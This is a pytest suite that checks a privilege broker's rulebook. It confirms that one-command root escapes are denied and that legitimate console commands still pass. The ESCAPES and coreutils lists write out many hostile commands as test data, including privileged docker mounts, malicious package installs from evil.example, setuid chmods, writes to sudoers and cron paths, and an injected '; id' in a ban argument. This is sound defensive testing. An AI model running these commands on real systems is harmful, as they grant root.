# SPDX-License-Identifier: AGPL-3.0-or-later
# infra-TAK — TAK Infrastructure Platform
# Copyright (C) 2026 Andreas Johansson (TAKWERX)
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU Affero General Public License as published
# by the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU Affero General Public License for more details.
#
# You should have received a copy of the GNU Affero General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.
"""Broker rulebook: one-command root escapes are refused (ops #645 W0).

Each ESCAPES row was ALLOWED by `check_exec` in ENFORCE mode on dev d67aa04 and runs
a command of the caller's choosing as root (or reads/writes any host file). Each
LEGIT row is a shape the console really sends (static scan of app.py/modules, and
the broker audit logs of test6 and test12), so tightening the gate cannot break it.

Nothing is executed: the rulebook is called directly, and the docker cp staging is
run against a fake subprocess.
"""

import importlib.util
import os
import pathlib
import subprocess
import types

import pytest

REPO = pathlib.Path(__file__).resolve().parent.parent
H = '/home/takwerx'


def _broker():
    spec = importlib.util.spec_from_file_location('takwerx_broker_ops645',
                                                  REPO / 'broker' / 'takwerx_broker.py')
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


B = _broker()


ESCAPES = [
    # ip: no gate at all — `ip netns exec` runs anything
    ['ip', 'netns', 'exec', 'x', '/bin/sh', '-c', 'id'],
    ['ip', '-n', 'x', 'addr', 'show'],
    ['ip', '-b', '/tmp/batch'],
    ['ip', '-batch', '/tmp/batch'],
    ['ip', 'link', 'set', 'eth0', 'down'],
    ['ip', 'route', 'add', 'default', 'via', '10.0.0.1'],
    ['ip', 'addr', 'flush', 'dev', 'eth0'],
    # dpkg: no gate — -i runs the package's maintainer scripts as root
    ['dpkg', '-i', H + '/evil.deb'],
    ['dpkg', '--install', H + '/evil.deb'],
    ['dpkg', '--unpack', H + '/evil.deb'],
    ['dpkg', '-x', H + '/evil.deb', '/'],
    ['dpkg', '--root=/tmp/x', '--configure', '-a'],
    ['dpkg', '--force-all', '-i', H + '/evil.deb'],
    ['dpkg', '--configure', H + '/evil.deb'],
    ['dpkg', '--purge', '--force-all', '../x'],
    # fail2ban-client: no gate — fail2ban-server (root) runs action commands
    ['fail2ban-client', 'set', 'sshd', 'action', 'x', 'actionban', 'touch /root/pwn'],
    ['fail2ban-client', 'set', 'sshd', 'addaction', 'x'],
    ['fail2ban-client', 'set', 'logtarget', '/etc/cron.d/x'],
    ['fail2ban-client', 'set', 'dbfile', '/etc/x'],
    ['fail2ban-client', 'add', 'evil', 'auto'],
    ['fail2ban-client', '-c', H + '/f2b', 'reload'],
    ['fail2ban-client', 'start'],
    ['fail2ban-client', 'set', 'sshd', 'banip', '1.2.3.4; id'],
    # postconf: no gate — Postfix master (root) runs daemons from daemon_directory
    ['postconf', '-e', 'daemon_directory=' + H + '/x'],
    ['postconf', '-e', 'mailbox_command=/bin/sh -c id'],
    ['postconf', '-e', 'content_filter=evil'],
    ['postconf', '-e', 'relayhost=x|y'],
    ['postconf', '-c', H + '/pf', '-e', 'myhostname=x'],
    ['postconf', '-M', 'evil/unix=evil unix - n n - - pipe argv=/bin/sh'],
    ['postconf', '-F', 'smtp/inet/command=/bin/sh'],
    ['postconf', '-P', 'smtp/inet/x=y'],
    # docker: `container` form skipped every run check
    ['docker', 'container', 'run', '--privileged', '-v', '/:/host', 'alpine'],
    ['docker', 'container', 'create', '--privileged', 'alpine'],
    ['docker', 'container', 'exec', '--privileged', 'nodered', 'sh'],
    ['docker', 'container', 'cp', 'nodered:/x', '/etc/sudoers.d/x'],
    ['docker', 'image', 'save', '-o', '/etc/cron.d/x', 'alpine'],
    # docker run/create: caps, devices, namespaces, security opts
    ['docker', 'run', '--privileged=true', 'alpine'],
    ['docker', 'run', '--cap-add', 'SYS_ADMIN', 'alpine'],
    ['docker', 'run', '--cap-add=ALL', 'alpine'],
    ['docker', 'run', '--device', '/dev/sda', 'alpine'],
    ['docker', 'run', '--device=/dev/sda', 'alpine'],
    ['docker', 'run', '--security-opt', 'apparmor=unconfined', 'alpine'],
    ['docker', 'run', '--security-opt=seccomp=unconfined', 'alpine'],
    ['docker', 'run', '--pid', 'host', 'alpine'],
    ['docker', 'run', '--network=host', 'alpine'],
    ['docker', 'run', '--net', 'host', 'alpine'],
    ['docker', 'run', '--uts=host', 'alpine'],
    ['docker', 'run', '--cgroupns', 'host', 'alpine'],
    ['docker', 'run', '--userns=host', 'alpine'],
    ['docker', 'run', '--volumes-from', 'nodered', 'alpine'],
    ['docker', 'run', '--runtime', 'evil', 'alpine'],
    ['docker', 'run', '--env-file', '/etc/shadow', 'alpine'],
    ['docker', 'run', '--cidfile', '/etc/cron.d/x', 'alpine'],
    ['docker', 'create', '--cap-add', 'SYS_PTRACE', 'alpine'],
    # docker run: mount forms the old check misread
    ['docker', 'run', '--mount', 'src=/etc,type=bind,dst=/x', 'alpine'],
    ['docker', 'run', '--mount', 'type=volume,src=v,dst=/x,volume-opt=type=none,'
     'volume-opt=device=/etc,volume-opt=o=bind', 'alpine'],
    ['docker', 'run', '-v', './etc:/x', 'alpine'],
    ['docker', 'run', '-v/:/host', 'alpine'],
    ['docker', 'run', '-dv', '/:/host', 'alpine'],
    ['docker', 'run', '-v', '/var/run/docker.sock:/s', 'alpine'],
    # an unknown value-flag must not end the flag check early
    ['docker', 'run', '--gpus', 'all', '--privileged', 'alpine'],
    ['docker', 'run', '--some-new-flag', 'x', '--privileged', 'alpine'],
    ['docker', 'run', '--use-api-socket', 'alpine'],
    ['docker', 'exec', '-u', '0', '--privileged', 'nodered', 'sh'],
    ['docker', 'exec', '-e', 'X=1', '--privileged', 'nodered', 'sh'],
    ['docker', 'compose', 'exec', '-T', '-u', '0', '--privileged', 'svc', 'sh'],
    ['docker', 'compose', 'run', '-u', '0', '--cap-add', 'ALL', 'svc'],
    # docker exec
    ['docker', 'exec', '--privileged', 'nodered', 'sh'],
    ['docker', 'exec', '--privileged=true', '-u', '0', 'nodered', 'sh'],
    # docker volume create bound to a host dir
    ['docker', 'volume', 'create', '--opt', 'type=none', '--opt', 'device=/etc',
     '--opt', 'o=bind', 'etcvol'],
    ['docker', 'volume', 'create', '-o', 'device=/etc', 'etcvol'],
    ['docker', 'volume', 'create', '--driver', 'evil', 'v'],
    # docker compose run/exec: not checked at all
    ['docker', 'compose', '-f', H + '/node-red/docker-compose.yml', 'run', '-v', '/:/host',
     'nodered'],
    ['docker', 'compose', 'run', '--cap-add', 'SYS_ADMIN', 'svc'],
    ['docker', 'compose', 'run', '-v', '/etc:/x', 'svc'],
    ['docker', 'compose', 'exec', '--privileged', 'svc', 'sh'],
    ['docker', 'compose', 'cp', 'svc:/x', '/etc/sudoers.d/x'],
    # docker cp: host side unchecked (deny-list paths are refused outright;
    # any other host path is staged through the console user, tested below)
    ['docker', 'cp', 'nodered:/tmp/x', '/etc/sudoers.d/x'],
    ['docker', 'cp', '/etc/shadow', 'nodered:/tmp/x'],
    ['docker', 'cp', '-L', H + '/link', 'nodered:/tmp/x'],
    ['docker', 'cp', 'nodered:/x', 'relative/path'],
    # docker save/build write host files as root
    ['docker', 'save', '-o', '/etc/cron.d/x', 'alpine'],
    ['docker', 'save', '--output=/etc/x', 'alpine'],
    ['docker', 'build', '--output', 'type=local,dest=/etc/x', '.'],
    ['docker', 'buildx', 'build', '--allow', 'security.insecure', '.'],
    # package from a URL of the caller's choosing
    ['dnf', 'install', '-y', 'https://evil.example/x.rpm'],
    ['dnf', 'install', '-y', 'https://dl.fedoraproject.org.evil.example/x.rpm'],
    ['dnf', 'install', '-y', 'http://dl.fedoraproject.org/pub/epel/x.rpm'],
    ['apt-get', 'install', '-y', 'https://evil.example/x.deb'],
    # setuid/setgid: root marks a console-written file setuid -> root shell
    ['chmod', '4755', '/usr/bin/caddy'],
    ['chmod', '6755', '/opt/tak/x'],
    ['chmod', '2755', '/opt/tak/x'],
    ['chmod', 'u+s', '/opt/tak/x'],
    ['chmod', 'g=rxs', '/opt/tak/x'],
    ['chmod', 'a+rx,u+s', '/opt/tak/x'],
    ['chmod', '--reference=/usr/bin/passwd', '/opt/tak/x'],
    ['install', '-m', '4755', H + '/x', '/usr/bin/caddy'],
    ['install', '-m4755', H + '/x', '/usr/local/bin/mediamtx'],
    ['install', '--mode=6755', H + '/x', '/opt/tak/x'],
    ['cp', '--preserve=mode', H + '/x', '/opt/tak/x'],
    # write-then-root-runs paths the console never writes through the broker
    ['tee', '/etc/apt/apt.conf.d/00evil'],
    ['cp', H + '/x', '/etc/apt/apt.conf.d/00evil'],
    ['tee', '/etc/apt/apt.conf'],
    ['mv', H + '/x', '/etc/letsencrypt/renewal-hooks/deploy/evil.sh'],
    ['tee', '/etc/security/namespace.init'],
    ['tee', '/etc/ufw/before.init'],
    ['tee', '/etc/ufw/after.init'],
    # the broker's own audit log
    ['tee', '/var/log/takwerx-broker/audit.log'],
    ['rm', '-f', '/var/log/takwerx-broker/audit.log.1'],
    # git config / hooks of a root-run repo
    ['tee', '/root/tak-video-restreamer/.git/config'],
    ['cp', H + '/x', '/root/tak-video-restreamer/.git/hooks/post-merge'],
    ['ln', '-s', H + '/evil', '/root/tak-video-restreamer/.git'],
    # /opt/tak/apply-selinux.sh: writable, then `bash` runs it as root
    ['tee', '/opt/tak/apply-selinux.sh'],
    ['cp', H + '/x', '/opt/tak/apply-selinux.sh'],
]


WRITE_DENIED = [
    '/etc/apt/apt.conf.d/00evil',
    '/etc/letsencrypt/renewal-hooks/deploy/evil.sh',
    '/etc/security/namespace.init',
    '/var/log/takwerx-broker/audit.log',
    '/root/tak-video-restreamer/.git/config',
]

WRITE_ALLOWED = [
    '/var/log/takwerx-broker/.selftest',          # console self-test probe
    '/etc/apt/sources.list.d/docker.list',
    '/etc/fail2ban/action.d/infratak-guarddog.conf',   # content check is W2
    '/root/tak-video-restreamer/docker-compose.yml',   # compose check is W3
]


LEGIT = [
    # ip (read only)
    ['ip', '-4', 'route', 'show', 'default'],
    ['ip', '-4', '-o', 'addr', 'show', 'scope', 'global'],
    ['ip', '-o', '-4', 'addr', 'show'],
    ['ip', '-o', 'addr', 'show', 'scope', 'global'],
    ['ip', 'route', 'get', '1.1.1.1'],
    ['ip', '-j', 'link', 'show'],
    ['ip', 'addr'],
    # dpkg (app.py, modules/emailrelay.py)
    ['dpkg', '--print-architecture'],
    ['dpkg', '--configure', '-a'],
    ['dpkg', '--configure', 'takserver'],
    ['dpkg', '--configure', 'postfix'],
    ['dpkg', '--set-selections'],
    ['dpkg', '--purge', 'takserver'],
    ['dpkg', '--purge', '--force-all', 'takserver'],
    ['dpkg', '-l', 'postfix'],
    ['dpkg', '-l', 'postgresql-*'],
    ['dpkg', '-s', 'takserver'],
    ['dpkg', '-S', '/usr/bin/caddy'],
    ['dpkg', '--compare-versions', '5.4', 'ge', '5.3'],
    # fail2ban-client (app.py + audit logs)
    ['fail2ban-client', '--version'],
    ['fail2ban-client', 'status'],
    ['fail2ban-client', 'status', 'takserver-badcert'],
    ['fail2ban-client', 'reload'],
    ['fail2ban-client', 'reload', '--restart', 'takserver'],
    ['fail2ban-client', 'get', 'sshd', 'logpath'],
    ['fail2ban-client', 'set', 'sshd', 'banip', '203.0.113.7'],
    ['fail2ban-client', 'set', 'recidive', 'unbanip', '2001:db8::1'],
    ['fail2ban-client', 'set', 'takserver', 'unbanip', '198.51.100.0/24'],
    ['fail2ban-client', 'unban', '--all'],
    # postconf (Email Relay recovery path)
    ['postconf', '-e', 'myhostname=tak.example.org'],
    ['postconf', '-e', 'mydomain=example.org'],
    ['postconf', '-e', 'relayhost=[smtp-relay.brevo.com]:587'],
    ['postconf', '-e', 'smtp_sasl_password_maps=hash:/etc/postfix/sasl_passwd'],
    ['postconf', '-h', 'myhostname'],
    ['postconf', '-n'],
    # docker run/create/exec (app.py)
    ['docker', 'run', '--rm', '--user', '0', '-v', 'srcvol:/from', '-v', 'dstvol:/to',
     '--entrypoint', 'sh', 'img', '-c', 'cp -a /from/. /to/ 2>&1'],
    ['docker', 'run', '--rm', '--network', 'none', '--entrypoint', 'cat', 'img', '/x'],
    ['docker', 'run', '--rm', '-it', 'img'],
    ['docker', 'run', '-v', '/data', 'img'],
    ['docker', 'run', '--security-opt', 'no-new-privileges', 'img'],
    ['docker', 'run', '--privileged=false', 'img'],
    ['docker', 'exec', '-u', '0', 'nodered', 'sh', '-c', 'echo hi'],
    ['docker', 'exec', '--user', 'root', 'nodered', 'chmod', '666', '/tmp/build-flows.js'],
    ['docker', 'exec', '-i', 'cloudtak-api-1', 'sh'],
    ['docker', 'exec', '-d', '-e', 'X=1', 'c', 'sh', '-c', 'true'],
    ['docker', 'exec', '-e', 'PGPASSWORD=x', 'c', 'sh', '-c', 'psql -c "SELECT 1"'],
    ['docker', 'compose', 'exec', '-T', 'postgresql', 'psql', '-U', 'authentik', '-d',
     'authentik', '-c', 'SELECT pg_reload_conf();'],
    ['docker', 'compose', 'up', '-d', '--force-recreate', 'ldap'],
    ['docker', 'compose', '-f', H + '/node-red/docker-compose.yml', 'down'],
    ['docker', 'container', 'ls'],
    ['docker', 'container', 'inspect', 'nodered'],
    ['docker', 'image', 'prune', '-f'],
    ['docker', 'image', 'rm', 'cloudtak-api:infratak-rollback'],
    ['docker', 'image', 'inspect', '--format', '{{.Architecture}}', 'terratak:0.8.3'],
    ['docker', 'image', 'load', '--input', H + '/terratak/incoming/upload.tar'],
    ['docker', 'volume', 'create', 'takserver-db-data'],
    ['docker', 'volume', 'rm', 'v'],
    ['docker', 'build', '-t', 'img:tag', H + '/node-red'],
    ['docker', 'network', 'connect', 'infratak', 'abc123'],
    # docker cp (audit logs)
    ['docker', 'cp', H + '/TAK-Portal/data/ssh/tak_ssh_ed25519',
     '0ba686c652c6:/usr/src/app/data/ssh/tak_ssh_ed25519'],
    ['docker', 'cp', '/opt/infratak/nodered/static/.', 'nodered:/data/public/'],
    ['docker', 'cp', '/opt/tak/certs/files/takserver.pem',
     'fd8f87249dfc:/usr/src/app/data/certs/tak-ca.pem'],
    ['docker', 'cp', '/tmp/flows_merged.json', 'nodered:/data/flows.json'],
    ['docker', 'cp', 'fd8f87249dfc:/usr/src/app/data/settings.json', '-'],
    ['docker', 'cp', '-', 'nodered:/data/'],
    ['docker', 'cp', 'nodered:/data/flows.json', '/tmp/tmp.AbCdEf1234/f'],
    ['docker', 'cp', 'takserver-db:/tmp/export.sql', '/opt/tak/snapshots/x.sql'],
    # package managers
    ['dnf', 'install', '-y', 'caddy'],
    ['dnf', 'install', '-y', 'dnf-command(copr)'],
    ['dnf', 'install', '-y',
     'https://dl.fedoraproject.org/pub/epel/epel-release-latest-9.noarch.rpm'],
    ['dnf', 'install', '-y',
     'https://download.postgresql.org/pub/repos/yum/reporpms/EL-9-x86_64/'
     'pgdg-redhat-repo-latest.noarch.rpm'],
    ['dnf', 'install', '-y',
     'https://download1.rpmfusion.org/free/el/rpmfusion-free-release-9.noarch.rpm'],
    ['apt-get', 'install', '-y', 'fail2ban'],
    ['dnf', 'config-manager', '--add-repo',
     'https://download.docker.com/linux/rhel/docker-ce.repo'],
    # modes, copies and installs the console sends (audit logs)
    ['chmod', '755', '/opt/tak-guarddog/tak-db-watch.sh'],
    ['chmod', '600', '/opt/tak/certs/cert-metadata.sh'],
    ['chmod', '750', '/var/log/takwerx-broker'],
    ['chmod', '0644', '/var/log/caddy/takportal-access.log'],
    ['chmod', 'g+rwX', '/opt/tak/x'],
    ['chmod', '1777', '/opt/tak/x'],
    ['install', '-m', '644', '/tmp/nr_ctx_global.json', '/opt/tak/nodered-ctx-backup.json'],
    ['install', '-o', 'tak', '-g', 'tak', '-m', '640', '/tmp/takserver-le.jks',
     '/opt/tak/certs/files/takserver-le.jks'],
    ['cp', '-p', '/opt/tak/certs/files/ca.pem', '/opt/tak/certs/files/ca.pem.w1hold'],
    ['cp', '--preserve=mode,ownership', '/opt/tak/a', '/opt/tak/b'],
    ['mkdir', '-p', '/var/lib/takguard'],
]


@pytest.mark.parametrize('argv', ESCAPES, ids=lambda a: ' '.join(a)[:70])
def test_escape_is_denied(argv):
    with pytest.raises(B.Denied):
        B.check_exec(list(argv))


@pytest.mark.parametrize('argv', LEGIT, ids=lambda a: ' '.join(a)[:70])
def test_console_shape_still_allowed(argv):
    B.check_exec(list(argv))


@pytest.mark.parametrize('path', WRITE_DENIED)
def test_write_op_refuses_root_run_path(path):
    with pytest.raises(B.Denied):
        B._path_allowed(path)


@pytest.mark.parametrize('path', WRITE_ALLOWED)
def test_write_op_still_allows(path):
    B._path_allowed(path)


def test_root_git_refuses_console_owned_repo(monkeypatch, tmp_path):
    """`git -C /root/<module> …` runs as root and reads .git/config, whose keys run
    commands. A .git that is not root's (a test user's here) is refused."""
    repo = tmp_path / 'tak-video-restreamer'
    (repo / '.git' / 'hooks').mkdir(parents=True)
    (repo / '.git' / 'config').write_text('[core]\n\tfsmonitor = /tmp/evil\n')
    monkeypatch.setattr(B, 'ROOT_MODULE_DIRS', (str(repo) + '/',))
    if os.geteuid() == 0:
        pytest.skip('needs a non-root owner for the planted repo')
    with pytest.raises(B.Denied):
        B.check_exec(['git', '-C', str(repo), 'status'])
    # a module dir with no repo yet is not refused here (git fails on its own)
    bare = tmp_path / 'webodm'
    bare.mkdir()
    monkeypatch.setattr(B, 'ROOT_MODULE_DIRS', (str(bare) + '/',))
    B.check_exec(['git', '-C', str(bare), 'status'])


def test_setgid_on_a_real_directory_still_allowed(monkeypatch, tmp_path):
    """The console runs `chmod 2775 /usr/local/etc` (test6 audit log). Setgid on a
    directory only sets the group of new files, so it stays allowed; on a file, a
    symlink, or with -R it is refused."""
    d = tmp_path / 'etc'
    d.mkdir()
    f = tmp_path / 'file'
    f.write_text('x')
    lnk = tmp_path / 'lnk'
    lnk.symlink_to(d)
    monkeypatch.setattr(B, '_path_allowed', lambda p, readonly=False: p)
    B.check_exec(['chmod', '2775', str(d)])
    B.check_exec(['chmod', 'g+s', str(d)])
    for argv in (['chmod', '2775', str(f)], ['chmod', '2775', str(lnk)],
                 ['chmod', '-R', '2775', str(d)], ['chmod', '4775', str(d)],
                 ['chmod', 'u+s', str(d)], ['chmod', '+s', str(d)]):
        with pytest.raises(B.Denied):
            B.check_exec(argv)


def test_tak_selinux_script_must_be_as_installed(monkeypatch, tmp_path):
    """`bash /opt/tak/apply-selinux.sh` runs only a script owned by root or the TAK
    user in a root/TAK-owned, non-symlinked tree. A planted one (a test user's) and
    one reached through a symlink are refused."""
    if os.geteuid() == 0:
        pytest.skip('needs a non-root owner for the planted script')
    script = tmp_path / 'tak' / 'apply-selinux.sh'
    script.parent.mkdir()
    script.write_text('#!/bin/sh\nid > /tmp/pwn\n')
    monkeypatch.setattr(B, '_TAK_BASH_SCRIPTS', (str(script),))
    with pytest.raises(B.Denied):
        B.check_exec(['bash', str(script)])
    link = tmp_path / 'taklink'
    link.symlink_to(script.parent)
    monkeypatch.setattr(B, '_TAK_BASH_SCRIPTS', (str(link / 'apply-selinux.sh'),))
    with pytest.raises(B.Denied):
        B.check_exec(['bash', str(link / 'apply-selinux.sh')])


def test_cloudtak_build_compose_run_still_allowed(monkeypatch, tmp_path):
    """TAK Portal's CloudTAK marketplace step (cloudtakMarketplace.service.js
    `elevate_via_docker`): `docker compose run -u 0` with the console home and /tmp
    bound (test6/test12 audit logs; argv copied from the script on test12). Bind roots are swapped for tmp dirs so the
    realpath check runs on a real tree on any OS."""
    home, tmp = tmp_path / 'home', tmp_path / 'tmp'
    (home / 'CloudTAK').mkdir(parents=True)
    tmp.mkdir()
    (tmp / 'ctak-elevate.X').mkdir()
    monkeypatch.setattr(B, '_COMPOSE_RUN_BIND_OK', (str(home), str(tmp)))
    argv = ['docker', 'compose', 'run', '--rm', '--no-deps', '-u', '0',
            '-v', f'{home}/CloudTAK:{home}/CloudTAK:rw', '-v', f'{home}:{home}:rw',
            '-v', f'{tmp}:{tmp}:rw', '-v', f'{tmp}/ctak-elevate.X:{tmp}/ctak-elevate.X:ro',
            '-e', f'HOME={home}', '--entrypoint', '/bin/sh', 'api', f'{tmp}/ctak-elevate.X']
    B.check_exec(argv)
    # a symlink planted in the console home must not carry the bind out of it
    (home / 'out').symlink_to('/etc')
    with pytest.raises(B.Denied):
        B.check_exec(['docker', 'compose', 'run', '-v', f'{home}/out:/x', 'api'])


# --- docker cp: a host path off the allowlist never reaches root ---------------------

@pytest.mark.parametrize('argv,staged', [
    (['docker', 'cp', 'nodered:/data/flows.json', '/tmp/tmp.X/f'], True),
    (['docker', 'cp', 'nodered:/x', '/etc/cron.d/x'], True),
    (['docker', 'cp', '/tmp/flows_merged.json', 'nodered:/data/flows.json'], True),
    (['docker', 'cp', '/root/.bash_history', 'nodered:/tmp/x'], True),
    (['docker', 'container', 'cp', 'nodered:/x', '/usr/local/bin/x'], True),
    (['docker', 'cp', '/opt/tak/certs/files/takserver.pem', 'c:/x'], False),
    (['docker', 'cp', 'takserver-db:/tmp/e.sql', '/opt/tak/snapshots/e.sql'], False),
    (['docker', 'cp', 'c:/x', '-'], False),
    (['docker', 'cp', '-', 'c:/x'], False),
])
def test_docker_cp_staging_decision(argv, staged):
    assert B._docker_cp_needs_stage(argv) is staged


class _FakeRun:
    def __init__(self):
        self.calls = []

    def __call__(self, cmd, **kw):
        self.calls.append((list(cmd), kw))
        return subprocess.CompletedProcess(cmd, 0, b'', b'')


def _stage_env(monkeypatch, tmp_path):
    fake = _FakeRun()
    monkeypatch.setattr(B.subprocess, 'run', fake)
    monkeypatch.setattr(B, '_CP_STAGE_ROOT', str(tmp_path / 'stage'))
    monkeypatch.setattr(B.os, 'chown', lambda *a, **k: None)
    monkeypatch.setattr(B.os, 'lchown', lambda *a, **k: None)
    monkeypatch.setattr(B.pwd, 'getpwnam',
                        lambda n: types.SimpleNamespace(pw_uid=4242, pw_gid=4242))
    return fake


def test_container_to_host_writes_as_console_user(monkeypatch, tmp_path):
    fake = _stage_env(monkeypatch, tmp_path)
    B._docker_cp_staged(['docker', 'cp', 'nodered:/data/flows.json', '/etc/cron.d/x'], 60)
    (root_cmd, root_kw), (user_cmd, user_kw) = fake.calls
    # root: container -> its own staging dir; the host path is not in root's argv
    assert root_cmd[1] == 'cp' and root_cmd[2] == 'nodered:/data/flows.json'
    assert root_cmd[3].startswith(str(tmp_path / 'stage')) and '/etc/cron.d/x' not in root_cmd
    assert 'user' not in root_kw
    # the console user writes the host path, with its own uid
    assert user_cmd[:3] == ['cp', '-rP', '--'] and user_cmd[-1] == '/etc/cron.d/x'
    assert user_kw['user'] == 4242 and user_kw['group'] == 4242 and user_kw['extra_groups'] == []


def test_host_to_container_reads_as_console_user(monkeypatch, tmp_path):
    fake = _stage_env(monkeypatch, tmp_path)
    B._docker_cp_staged(['docker', 'cp', '/root/.ssh/id_ed25519', 'nodered:/tmp/k'], 60)
    (user_cmd, user_kw), (root_cmd, root_kw) = fake.calls
    assert user_cmd[0] == 'cp' and '/root/.ssh/id_ed25519' in user_cmd
    assert user_kw['user'] == 4242
    assert '/root/.ssh/id_ed25519' not in root_cmd and root_cmd[-1] == 'nodered:/tmp/k'
    assert root_cmd[-2].startswith(str(tmp_path / 'stage')) and 'user' not in root_kw


def test_host_dir_contents_form_kept(monkeypatch, tmp_path):
    """`docker cp /opt/infratak/nodered/static/. nodered:/data/public/` (Node-RED deploy)
    keeps its copy-the-contents meaning through the staging dir."""
    fake = _stage_env(monkeypatch, tmp_path)
    B._docker_cp_staged(['docker', 'cp', '/opt/infratak/nodered/static/.',
                         'nodered:/data/public/'], 60)
    (user_cmd, _), (root_cmd, _) = fake.calls
    assert user_cmd[-2] == '/opt/infratak/nodered/static'
    assert user_cmd[-1].endswith('/static')
    assert root_cmd[-2].endswith('/static/.') and root_cmd[-1] == 'nodered:/data/public/'


def test_do_exec_routes_off_allowlist_cp_through_staging(monkeypatch):
    seen = []
    monkeypatch.setattr(B, '_docker_cp_staged',
                        lambda argv, t: seen.append(argv) or
                        subprocess.CompletedProcess(argv, 0, b'', b''))
    monkeypatch.setattr(B.shutil, 'which', lambda n, path=None: '/usr/bin/' + n)
    B._do_exec({'argv': ['docker', 'container', 'cp', 'nodered:/x', '/tmp/tmp.X/f']})
    assert seen and seen[0][1:] == ['cp', 'nodered:/x', '/tmp/tmp.X/f']


# --- the coverage scanner runs in CI and gains no new gap -----------------------------

def test_enforce_coverage_scan_has_no_new_gaps():
    """broker/scan_enforce_coverage.py had no test, so a rulebook change could break a
    real call site in ENFORCE without anyone noticing. Its gap list may only shrink."""
    import sys
    sys.path.insert(0, str(REPO / 'broker'))
    try:
        spec = importlib.util.spec_from_file_location('scan_ops645',
                                                      REPO / 'broker' / 'scan_enforce_coverage.py')
        scan = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(scan)
    finally:
        sys.path.pop(0)
    gaps = set()
    for f in (REPO / 'app.py', REPO / 'selfheal_ip.py'):
        cmds, _ = scan.scan_file(str(f))
        for _, _, slots, dyn in cmds:
            verdict, _ = scan.evaluate_cmd(slots, dyn)
            if verdict == 'DENY':
                gaps.add(' '.join('|'.join(s) if s else '<var>' for s in slots))
    new = gaps - KNOWN_GAPS
    assert not new, 'rulebook now denies a console call site: %s' % sorted(new)


# Fully-literal call sites the rulebook already denied before ops #645 (dev a763f42).
# Each is a known, separate matter; this test only stops the list from growing.
KNOWN_GAPS = {
    'dnf <var>',
    'docker <var>',
    'docker manifest inspect <var>',
    'ls <var>',
    'nmcli -t -f DEVICE,TYPE,STATE device status',
    'nmcli -t -f DEVICE,TYPE,STATE,CONNECTION device status',
    'nmcli -t -f IP4.ADDRESS device show <var>',
    'nmcli -t -f SSID dev wifi list',
    'nmcli connection down <var>',
    'nmcli device disconnect <var>',
    'runuser -u postgres -- <var>',
    'runuser -u tak -- <var>',
    'sh <var>',
    'sysctl -w <var>',
    'systemctl <var>',
    'systemctl <var> caddy',
    'wpa_cli -i <var> select_network <var>',
}


# --- W0 add-on: coreutils flags that carried a path past the check ---------------------
# GNU chmod reads a dash mode (`-w,o+w`); the gate treated it as a flag and then skipped
# the real file as "the mode". --reference / --target-directory / -t name a path in the
# flag itself; cp -l/-s make a link to a root file that a later data write edits.

@pytest.mark.parametrize('argv', [
    ['chmod', '-w,o+w', '/etc/passwd'],
    ['chmod', '--', '-w,o+w', '/etc/passwd'],
    ['chmod', '-x', '/etc/passwd'],
    ['chown', '--reference=/home/takwerx/node-red/f', '/etc/passwd'],
    ['mv', '--target-directory=/etc/sudoers.d', '/var/log/x'],
    ['ln', '--target-directory=/etc/sudoers.d', '/var/log/x'],
    ['ln', '-t', '/etc/sudoers.d', '/var/log/x'],
    ['cp', '-t', '/etc/sudoers.d', '/var/log/x'],
    ['cp', '--target-directory=/etc/sudoers.d', '/var/log/x'],
    ['cp', '-l', '/etc/systemd/system/takwerx-console.service', '/var/log/x'],
    ['cp', '-s', '/etc/systemd/system/takwerx-console.service', '/var/log/x'],
    ['install', '-t', '/etc/sudoers.d', '/var/log/x'],
    ['install', '-Dt', '/etc/sudoers.d', '/var/log/x'],
    ['install', '--target-directory=/etc/sudoers.d', '/var/log/x'],
    ['touch', '--reference=/etc/shadow', '/var/log/x'],
])
def test_coreutils_flag_escape_is_denied(argv):
    with pytest.raises(B.Denied):
        B.check_exec(argv)


@pytest.mark.parametrize('argv', [
    # every flag shape in the console code and the test6/test12 audit logs
    ['chmod', '755', '/opt/tak-guarddog/tak-disk-watch.sh'],
    ['chmod', '-R', '755', '/var/lib/cesium-tiles'],
    ['chown', '-R', 'takwerx:takwerx', '/var/lib/takwerx-console'],
    ['chown', '-R', '-h', '--from=root:root', 'takwerx:takwerx', '/var/lib/takwerx-console'],
    ['mkdir', '-p', '/etc/systemd/system/takserver.service.d'],
    ['rm', '-f', '/var/lib/takguard/x'],
    ['rm', '-rf', '/var/lib/takguard/x'],
    ['mv', '-f', '/var/log/a', '/var/log/b'],
    ['cp', '-p', '/opt/tak/certs/files/a.p12', '/opt/tak/certs/files/b.p12'],
    ['cp', '-rp', '/opt/tak/certs/files', '/opt/tak/certs/files2'],
    ['cp', '-a', '/var/lib/caddy/x', '/var/lib/caddy/y'],
    ['install', '-D', '-m', '0644', '/tmp/x', '/usr/local/etc/mediamtx.yml'],
    ['install', '-o', 'root', '-g', 'root', '-m', '0644', '/tmp/x', '/etc/caddy/Caddyfile'],
    ['touch', '/var/lib/takguard/disk_alert_sent'],
])
def test_coreutils_console_flags_still_allowed(argv):
    B.check_exec(argv)
